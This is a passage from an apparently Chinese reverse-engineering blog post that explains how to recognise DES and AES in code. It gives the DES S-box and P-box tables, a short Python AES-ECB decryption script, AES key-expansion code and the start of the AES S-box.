class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> S_Box[<span class="number">8</span>][<span class="number">4</span>][<span class="number">16</span>] = &#123;</span><br><span class="line"><span class="comment">// S1</span></span><br><span class="line">        <span class="number">14</span>, <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">8</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">7</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">15</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">        <span class="number">4</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">2</span>, <span class="number">11</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">3</span>, <span class="number">10</span>,  <span class="number">5</span>,  <span class="number">0</span>,</span><br><span class="line">        <span class="number">15</span>, <span class="number">12</span>,  <span class="number">8</span>,  <span class="number">2</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,  <span class="number">3</span>, <span class="number">14</span>, <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="comment">// S2</span></span><br><span class="line">        <span class="number">15</span>, <span class="number">1</span>,  <span class="number">8</span>, <span class="number">14</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">10</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">13</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">15</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">14</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">11</span>,  <span class="number">5</span>,</span><br><span class="line">        <span class="number">0</span>, <span class="number">14</span>,  <span class="number">7</span>, <span class="number">11</span>, <span class="number">10</span>,  <span class="number">4</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">0</span>,  <span class="number">5</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">        <span class="comment">// S3</span></span><br><span class="line">        <span class="number">10</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">14</span>,  <span class="number">6</span>,  <span class="number">3</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">8</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">9</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">14</span>, <span class="number">12</span>, <span class="number">11</span>, <span class="number">15</span>,  <span class="number">1</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">6</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">1</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">5</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">7</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">3</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">2</span>, <span class="number">12</span>,</span><br><span class="line">        <span class="comment">// S4</span></span><br><span class="line">        <span class="number">7</span>,  <span class="number">13</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">0</span>,  <span class="number">6</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">4</span>, <span class="number">15</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">8</span>, <span class="number">11</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">        <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">9</span>,  <span class="number">0</span>, <span class="number">12</span>, <span class="number">11</span>,  <span class="number">7</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">1</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,</span><br><span class="line">        <span class="number">3</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">9</span>,  <span class="number">4</span>,  <span class="number">5</span>, <span class="number">11</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">2</span>, <span class="number">14</span>,</span><br><span class="line">        <span class="comment">// S5</span></span><br><span class="line">        <span class="number">2</span>,  <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">7</span>, <span class="number">10</span>, <span class="number">11</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">5</span>,  <span class="number">3</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,</span><br><span class="line">        <span class="number">14</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">4</span>,  <span class="number">7</span>, <span class="number">13</span>,  <span class="number">1</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">1</span>, <span class="number">11</span>, <span class="number">10</span>, <span class="number">13</span>,  <span class="number">7</span>,  <span class="number">8</span>, <span class="number">15</span>,  <span class="number">9</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">3</span>,  <span class="number">0</span>, <span class="number">14</span>,</span><br><span class="line">        <span class="number">11</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">7</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">2</span>, <span class="number">13</span>,  <span class="number">6</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">9</span>, <span class="number">10</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">3</span>,</span><br><span class="line">        <span class="comment">// S6</span></span><br><span class="line">        <span class="number">12</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">9</span>,  <span class="number">2</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>, <span class="number">13</span>,  <span class="number">3</span>,  <span class="number">4</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">11</span>,</span><br><span class="line">        <span class="number">10</span>, <span class="number">15</span>,  <span class="number">4</span>,  <span class="number">2</span>,  <span class="number">7</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">14</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">3</span>,  <span class="number">8</span>,</span><br><span class="line">        <span class="number">9</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">5</span>,  <span class="number">2</span>,  <span class="number">8</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">0</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">1</span>, <span class="number">13</span>, <span class="number">11</span>,  <span class="number">6</span>,</span><br><span class="line">        <span class="number">4</span>,  <span class="number">3</span>,  <span class="number">2</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">5</span>, <span class="number">15</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">14</span>,  <span class="number">1</span>,  <span class="number">7</span>,  <span class="number">6</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,</span><br><span class="line">        <span class="comment">// S7</span></span><br><span class="line">        <span class="number">4</span>, <span class="number">11</span>,  <span class="number">2</span>, <span class="number">14</span>, <span class="number">15</span>,  <span class="number">0</span>,  <span class="number">8</span>, <span class="number">13</span>,  <span class="number">3</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">7</span>,  <span class="number">5</span>, <span class="number">10</span>,  <span class="number">6</span>,  <span class="number">1</span>,</span><br><span class="line">        <span class="number">13</span>,  <span class="number">0</span>, <span class="number">11</span>,  <span class="number">7</span>,  <span class="number">4</span>,  <span class="number">9</span>,  <span class="number">1</span>, <span class="number">10</span>, <span class="number">14</span>,  <span class="number">3</span>,  <span class="number">5</span>, <span class="number">12</span>,  <span class="number">2</span>, <span class="number">15</span>,  <span class="number">8</span>,  <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,  <span class="number">4</span>, <span class="number">11</span>, <span class="number">13</span>, <span class="number">12</span>,  <span class="number">3</span>,  <span class="number">7</span>, <span class="number">14</span>, <span class="number">10</span>, <span class="number">15</span>,  <span class="number">6</span>,  <span class="number">8</span>,  <span class="number">0</span>,  <span class="number">5</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">        <span class="number">6</span>, <span class="number">11</span>, <span class="number">13</span>,  <span class="number">8</span>,  <span class="number">1</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">7</span>,  <span class="number">9</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">15</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">3</span>, <span class="number">12</span>,</span><br><span class="line">        <span class="comment">// S8</span></span><br><span class="line">        <span class="number">13</span>,  <span class="number">2</span>,  <span class="number">8</span>,  <span class="number">4</span>,  <span class="number">6</span>, <span class="number">15</span>, <span class="number">11</span>,  <span class="number">1</span>, <span class="number">10</span>,  <span class="number">9</span>,  <span class="number">3</span>, <span class="number">14</span>,  <span class="number">5</span>,  <span class="number">0</span>, <span class="number">12</span>,  <span class="number">7</span>,</span><br><span class="line">        <span class="number">1</span>, <span class="number">15</span>, <span class="number">13</span>,  <span class="number">8</span>, <span class="number">10</span>,  <span class="number">3</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">12</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span>,  <span class="number">0</span>, <span class="number">14</span>,  <span class="number">9</span>,  <span class="number">2</span>,</span><br><span class="line">        <span class="number">7</span>, <span class="number">11</span>,  <span class="number">4</span>,  <span class="number">1</span>,  <span class="number">9</span>, <span class="number">12</span>, <span class="number">14</span>,  <span class="number">2</span>,  <span class="number">0</span>,  <span class="number">6</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">15</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">8</span>,</span><br><span class="line">        <span class="number">2</span>,  <span class="number">1</span>, <span class="number">14</span>,  <span class="number">7</span>,  <span class="number">4</span>, <span class="number">10</span>,  <span class="number">8</span>, <span class="number">13</span>, <span class="number">15</span>, <span class="number">12</span>,  <span class="number">9</span>,  <span class="number">0</span>,  <span class="number">3</span>,  <span class="number">5</span>,  <span class="number">6</span>, <span class="number">11</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>P盒置换：</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">char</span> P_Table[<span class="number">32</span>] = &#123;</span><br><span class="line">        <span class="number">16</span>, <span class="number">7</span>, <span class="number">20</span>, <span class="number">21</span>, <span class="number">29</span>, <span class="number">12</span>, <span class="number">28</span>, <span class="number">17</span>, <span class="number">1</span>,  <span class="number">15</span>, <span class="number">23</span>, <span class="number">26</span>, <span class="number">5</span>,  <span class="number">18</span>, <span class="number">31</span>, <span class="number">10</span>,</span><br><span class="line">        <span class="number">2</span>,  <span class="number">8</span>, <span class="number">24</span>, <span class="number">14</span>, <span class="number">32</span>, <span class="number">27</span>, <span class="number">3</span>,  <span class="number">9</span>,  <span class="number">19</span>, <span class="number">13</span>, <span class="number">30</span>, <span class="number">6</span>,  <span class="number">22</span>, <span class="number">11</span>, <span class="number">4</span>,  <span class="number">25</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="0x03-AES"><a href="#0x03-AES" class="headerlink" title="0x03 AES"></a>0x03 AES</h2><p>​    AES加密是一种经典的分组、对称加密算法，其出现是为了代替安全性不够的DES算法。</p><h3 id="一、解密脚本-2"><a href="#一、解密脚本-2" class="headerlink" title="一、解密脚本"></a>一、解密脚本</h3><p>类型转化可以参考上文DES中的transform函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line">password = <span class="string">b&#x27;1234567890123456&#x27;</span> <span class="comment">#秘钥，b就是表示为bytes类型</span></span><br><span class="line">cipher= <span class="string">b&#x27;\xfc\xad\x71\x5b\xd7\x3b\x5c\xb0\x48\x8f\x84\x0f\x3b\xad\x78\x89\xd0\xe7\x09\xd0\xff\xd3\x8c\x6d\xfe\xc5\x5c\xcb\x9f\x47\x5b\x01&#x27;</span></span><br><span class="line">aes = AES.new(password,AES.MODE_ECB) <span class="comment">#创建一个aes对象</span></span><br><span class="line">den_text = aes.decrypt(cipher) <span class="comment"># 解密密文</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;answer is:&quot;</span>,den_text)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="二、程序情况-2"><a href="#二、程序情况-2" class="headerlink" title="二、程序情况"></a>二、程序情况</h3><h4 id="1、基本情况"><a href="#1、基本情况" class="headerlink" title="1、基本情况"></a>1、基本情况</h4><p>​    在AES标准规范中，<strong>分组长度只能是128位</strong>，也就是说，每个分组为<strong>16个字节</strong>（每个字节8位）。密钥的长度可以使用128位、192位或256位。密钥的长度不同，推荐加密轮数也不同，如下表所示：</p><table><thead><tr><th>AES</th><th>密钥长度（32位比特字)</th><th>分组长度(32位比特字)</th><th>加密轮数</th></tr></thead><tbody><tr><td>AES-128</td><td>4</td><td>4</td><td>10</td></tr><tr><td>AES-192</td><td>6</td><td>4</td><td>12</td></tr><tr><td>AES-256</td><td>8</td><td>4</td><td>14</td></tr></tbody></table><h4 id="2、加密流程"><a href="#2、加密流程" class="headerlink" title="2、加密流程"></a>2、加密流程</h4><p>分组后，每一组的加密流程如下：</p><p><img src="https://cdn.jsdelivr.net/gh/lhl7/My_pics/Typora/image-20220625184844702.png" alt="image-20220625184844702"></p><p>​    如图，前9轮每轮有四步，最后一轮不进行列混合。</p><h4 id="3、特征情况"><a href="#3、特征情况" class="headerlink" title="3、特征情况"></a>3、特征情况</h4><p>​    注意，这里不涉及到AES的加密流程讲解，只涉及到特征。</p><p><strong>密钥拓展：</strong></p><p>​    轮函数加密一定需要密钥，因此密钥拓展一定发生在一开始：</p><p>​    密钥拓展函数中，会进行两个循环：</p><p>第一个用于求<strong>w0-w3</strong>，第二个用于求<strong>w4-w43</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">/* W[0-3] */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">4</span>; ++i) &#123;</span><br><span class="line">        LOAD32H(w[i], key + <span class="number">4</span>*i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* W[4-43] */</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">        w[<span class="number">4</span>] = w[<span class="number">0</span>] ^ MIX(w[<span class="number">3</span>]) ^ rcon[i]; <span class="comment">//常量rcon</span></span><br><span class="line">        w[<span class="number">5</span>] = w[<span class="number">1</span>] ^ w[<span class="number">4</span>];</span><br><span class="line">        w[<span class="number">6</span>] = w[<span class="number">2</span>] ^ w[<span class="number">5</span>];</span><br><span class="line">        w[<span class="number">7</span>] = w[<span class="number">3</span>] ^ w[<span class="number">6</span>];</span><br><span class="line">        w += <span class="number">4</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">//其中：</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LOAD32H(x, y) \</span></span><br><span class="line"><span class="meta">  do &#123; (x) = ((unsigned int)((y)[0] &amp; 0xff)&lt;&lt;24) | ((unsigned int)((y)[1] &amp; 0xff)&lt;&lt;16) | \</span></span><br><span class="line"><span class="meta">             ((unsigned int)((y)[2] &amp; 0xff)&lt;&lt;8)  | ((unsigned int)((y)[3] &amp; 0xff));&#125; while(0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIX(x) (((S[BYTE(x, 2)] &lt;&lt; 24) &amp; 0xff000000) ^ ((S[BYTE(x, 1)] &lt;&lt; 16) &amp; 0xff0000) ^ \</span></span><br><span class="line"><span class="meta">                ((S[BYTE(x, 0)] &lt;&lt; 8) &amp; 0xff00) ^ (S[BYTE(x, 3)] &amp; 0xff))</span></span><br></pre></td></tr></table></figure><p>两个循环的为代码中，都会有如上所示的移位和异或运算。</p><p>同时，如上代码块所示，还有重要常量rcon：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> rcon[<span class="number">10</span>] = &#123;</span><br><span class="line">        <span class="number">0x01000000</span>UL, <span class="number">0x02000000</span>UL, <span class="number">0x04000000</span>UL, <span class="number">0x08000000</span>UL, <span class="number">0x10000000</span>UL,</span><br><span class="line">        <span class="number">0x20000000</span>UL, <span class="number">0x40000000</span>UL, <span class="number">0x80000000</span>UL, <span class="number">0x1B000000</span>UL, <span class="number">0x36000000</span>UL</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>初始变换：</strong></p><p>​    就是一顿的异或。</p><p><strong>轮函数：</strong></p><p>​    轮函数中，我们涉及到四个函数：</p><ul><li>subBytes(state);    字节代换</li><li>shiftRows(state)；行移位</li><li>mixColumns(state);   列混合</li><li>addRoundKey(state, rk);    轮密钥加</li></ul><p>​    <strong>字节代换</strong>中我们会用到非常重要的<strong>常量S盒</strong>（S盒一样基本就实锤了）：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> S[<span class="number">256</span>] = &#123;</span><br><span class="line">        <span class="number">0x63</span>, <span class="number">0x7C</span>, <span class="number">0x77</span>, <span class="number">0x7B</span>, <span class="number">0xF2</span>, <span class="number">0x6B</span>, <span class="number">0x6F</span>, <span class="number">0xC5</span>, <span class="number">0x30</span>, <span class="number">0x01</span>, <span class="number">0x67</span>, <span class="number">0x2B</span>, <span class="number">0xFE</span>, <span class="number">0xD7</span>, <span class="number">0xAB</span>, <span class="number">0x76</span>,</span><br><span class="line">        <span class="number">0xCA</span>, <span class="number">0x82</span>, <span class="number">0xC9</span>, <span class="number">0x7D</span>, <span class="number">0xFA</span>, <span class="number">0x59</span>, <span class="number">0x47</span>, <span class="number">0xF0</span>, <span class="number">0xAD</span>, <span class="number">0xD4</span>, <span class="number">0xA2</span>, <span class="number">0xAF</span>, <span class="number">0x9C</span>, <span class="number">0xA4</span>, <span class="number">0x72</span>, <span class="number">0xC0</span>,</span><br><span class="line">        <span class="number">0xB7</span>, <span class="number">0xFD</span>, <span class="number">0x93</span>, <span class="number">0x26</span>, <span class="number">0x36</span>, <span class="number">0x3F</span>, <span class="number">0xF7</span>, <span class="number">0xCC</span>, <span class="number">0x34</span>, <span class="number">0xA5</span>, <span class="number">0xE5</span>, <span class="number">0xF1</span>, <span class="number">0x71</span>, <span class="number">0xD8</span>, <span class="number">0x31</span>, <span class="number">0x15</span>,</span><br><span class="line">        <span class="number">0x04</span>, <span class="number">0xC7</span>, <span class="number">0x23</span>, <span class="number">0xC3</span>, <span class="number">0x18</span>, <span class="number">0x96</span>, <span class="number">0x05</span>, <span class="number">0x9A</span>, <span class="number">0x07</span>, <span class="number">0x12</span>, <span class="number">0x80</span>, <span class="number">0xE2</span>, <span class="number">0xEB</span>, <span class="number">0x27</span>, <span class="number">0xB2</span>, <span class="number">0x75</span>,</span><br><span class="line">        <span class="number">0x09</span>, <span class="number">0x83</span>, <span class="number">0x2C</span>, <span class="number">0x1A</span>, <span class="number">0x1B</span>, <span class="number">0x6E</span>, <span class="number">0x5A</span>, <span class="number">0xA0</span>, <span class="number">0x52</span>, <span class="number">0x3B</span>, <span class="number">0xD6</span>, <span class="number">0xB3</span>, <span class="number">0x29</span>, <span class="number">0xE3</span>, <span class="number">0x2F</span>, <span class="number">0x84</span>,</span><br><span class="line">        <span class="number">0x53</span>, <span class="number">0xD1</span>, <span class="number">0x00</span>, <span class="number">0xED</span>, <span class="number">0x20</span>, <span class="number">0xFC</span>, <span class="number">0xB1</span>, <span class="number">0x5B</span>, <span class="number">0x6A</span>, <span class="number">0xCB</span>, <span class="number">0xBE</span>, <span class="number">0x39</span>, <span class="number">0x4A</span>, <span class="number">0x4C</span>, <span class="number">0x58</span>, <span class="number">0xCF</span>,</span><br><span class="line">        <span class="number">0xD0</span>, <span class="number">0xEF</span>, <span class="number">0xAA</span>, <span class="number">0xFB</span>, <span class="number">0x43</span>, <span class="number">0x4D</span>, <span class="number">0x33</span>, <span class="number">0x85</span>, <span class="number">0x45</span>, <span class="number">0xF9</span>, <span class="number">0x02</span>, <span class="number">0x7F</span>, <span class="number">0x50</span>, <span class="number">0x3C</span>, <span class="number">0x9F</span>, <span class="number">0xA8</span>,</span><br><span class="line">        <span class="number">0x51</span>, <span class="number">0xA3</span>, <span class="number">0x40</span>, <span class="number">0x8F</span>, <span class="number">0x92</span>, <span class="number">0x9D</span>, <span class="number">0x38</span>, <span class="number">0xF5</span>, <span class="number">0xBC</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x21</span>, <span class="number">0x10</span>, <span class="number">0xFF</span>, <span class="number">0xF3</span>, <span class="number">0xD2</span>,</span><br><span class="line">        <span class="number">0xCD</span>, <span class="number">0x0C</span>, <span class="number">0x13</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">        <span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">        <span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line">        <span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">        <span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line">        <span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line">        <span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">        <span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span 